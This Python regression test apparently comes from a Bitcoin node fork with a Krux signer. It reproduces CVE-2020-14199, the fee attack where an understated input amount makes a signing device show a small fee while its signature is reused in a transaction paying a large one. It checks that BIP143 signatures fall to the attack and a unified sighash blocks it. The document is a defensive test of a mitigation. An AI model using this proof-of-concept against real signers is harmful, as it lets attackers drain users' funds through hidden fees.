#!/usr/bin/env python3
"""CVE-2020-14199 demonstrated against a real signer and a real node.

The attack: a signing device is told one input is worth far less than it is,
displays a small fee, signs, and its signature is then reused in the real
transaction, which pays an enormous fee to a miner.

BIP143 commits to the amount of the input being signed but not to the others,
so the lie never enters the digest and the signature stays valid. The unified
sighash commits to every spent amount, so the same lie invalidates it.

Driven through krux.psbt.PSBTSigner, so the amounts on the review screen and
the amounts the signer commits to are the ones the device would use.
"""

import os
import sys

# Krux's own source, for the PSBTSigner the app really uses.
_KRUX = os.environ.get("KRUX_SRC")
if not _KRUX:
    _KRUX = os.path.join(os.path.dirname(__file__), "..", "..", "src")
sys.path.insert(0, os.path.abspath(_KRUX))

from test_framework.test_framework import BitcoinTestFramework
from test_framework.wallet import MiniWallet

from embit.networks import NETWORKS
from embit.psbt import PSBT, DerivationPath
from embit.transaction import SIGHASH, Transaction, TransactionInput, TransactionOutput
from embit import bip32, ec, script

from krux.key import Key, TYPE_SINGLESIG
from krux.wallet import Wallet

ACTIVATION_HEIGHT = 150
HONEST, LIE = 10 * 100_000_000, 1_000_000  # 10 BTC really, 0.01 BTC claimed
SMALL = 1 * 100_000_000
MNEMONIC = (
    "abandon abandon abandon abandon abandon abandon "
    "abandon abandon abandon abandon abandon about"
)


class CVE202014199(BitcoinTestFramework):
    def set_test_params(self):
        self.num_nodes = 1
        self.setup_clean_chain = True
        self.extra_args = [
            [
                f"-testactivationheight=blake2b@{ACTIVATION_HEIGHT}",
                "-corepolicy=0",
                "-acceptnonstdtxn=1",
            ]
        ]

    def build(self, utxos, out_value, sink):
        return Transaction(
            vin=[
                TransactionInput(
                    bytes.fromhex(u["txid"]), u["sent_vout"], sequence=0xFFFFFFFE
                )
                for u in utxos
            ],
            vout=[TransactionOutput(out_value, sink)],
        )

    def run_test(self):
        from krux import sighash as krux_sighash

        node = self.nodes[0]
        wallet = MiniWallet(node)
        self.generate(wallet, ACTIVATION_HEIGHT + 10)

        # A real Krux wallet: the key the device holds, and the derivation a
        # coordinator would name for it on a single-sig p2wpkh spend.
        krux_wallet = Wallet(Key(MNEMONIC, TYPE_SINGLESIG, NETWORKS["regtest"]))
        child = krux_wallet.key.root.derive("m/84h/1h/0h/0/0")
        victim = child.key
        derivation = DerivationPath(
            krux_wallet.key.fingerprint, bip32.parse_path("m/84h/1h/0h/0/0")
        )

        attacker = ec.PrivateKey(bytes.fromhex("55" * 32))
        v_spk = script.p2wpkh(victim.get_public_key())
        a_spk = script.p2wpkh(attacker.get_public_key())
        sink = script.p2wpkh(ec.PrivateKey(bytes.fromhex("66" * 32)).get_public_key())

        # input 0: the victim's, small. input 1: attacker-controlled, large.
        u0 = wallet.send_to(
            from_node=node, scriptPubKey=bytes(v_spk.data), amount=SMALL
        )
        u1 = wallet.send_to(
            from_node=node, scriptPubKey=bytes(a_spk.data), amount=HONEST
        )
        self.generate(wallet, 1)
        self.log.info(
            "victim input %s BTC, attacker input %s BTC (device will be told %s)",
            SMALL / 1e8,
            HONEST / 1e8,
            LIE / 1e8,
        )

        for label, ht in (
            ("BIP143 segwit v0", SIGHASH.ALL),
            ("unified opt-in", SIGHASH.ALL | SIGHASH.UNIFIED),
        ):
            tx = self.build([u0, u1], SMALL + LIE - 10_000, sink)

            # what the device is shown: input 1 understated
            lied = PSBT(tx)
            lied.inputs[0].witness_utxo = TransactionOutput(SMALL, v_spk)
            lied.inputs[0].bip32_derivations[victim.get_public_key()] = derivation
            lied.inputs[1].witness_utxo = TransactionOutput(LIE, a_spk)
            for inp in lied.inputs:
                inp.sighash_type = ht

            shown, _ = krux_sighash.screen_sighash_type(lied, krux_wallet.key)
            assert shown is not None, f"{label}: the device would refuse this PSBT"
            self.log.info("%s: the review screen would say %s", label, hex(shown))

            shown_fee = (SMALL + LIE) - (SMALL + LIE - 10_000)
            sig0 = victim.sign(lied.sighash(0, sighash=ht)).serialize() + bytes([ht])

            # the real transaction, with input 1 at its true value
            real = PSBT(tx)
            real.inputs[0].witness_utxo = TransactionOutput(SMALL, v_spk)
            real.inputs[0].bip32_derivations[victim.get_public_key()] = derivation
            real.inputs[1].witness_utxo = TransactionOutput(HONEST, a_spk)
            for inp in real.inputs:
                inp.sighash_type = ht
            sig1 = attacker.sign(real.sighash(1, sighash=ht)).serialize() + bytes([ht])
            real_fee = (SMALL + HONEST) - (SMALL + LIE - 10_000)

            tx.vin[0].witness = script.Witness([sig0, victim.get_public_key().sec()])
            tx.vin[1].witness = script.Witness([sig1, attacker.get_public_key().sec()])
            # maxfeerate=0: judge the signature, not fee policy
            res = node.testmempoolaccept([tx.serialize().hex()], 0)[0]

            self.log.info(
                "%s: device shown fee %s BTC, real fee %s BTC",
                label,
                shown_fee / 1e8,
                real_fee / 1e8,
            )
            self.log.info(
                "  victim's signature valid in the real transaction: %s %s",
                res["allowed"],
                res.get("reject-reason", ""),
            )
            if ht == SIGHASH.ALL:
                assert res["allowed"], "the attack should succeed under BIP143"
                self.log.info("  ATTACK SUCCEEDS: the lie never entered the digest")
            else:
                assert not res["allowed"], "the unified sighash must block this"
                assert "missing-inputs" not in res.get("reject-reason", ""), res
                self.log.info("  ATTACK BLOCKED: every spent amount is committed to")


if __name__ == "__main__":
    CVE202014199(__file__).main()
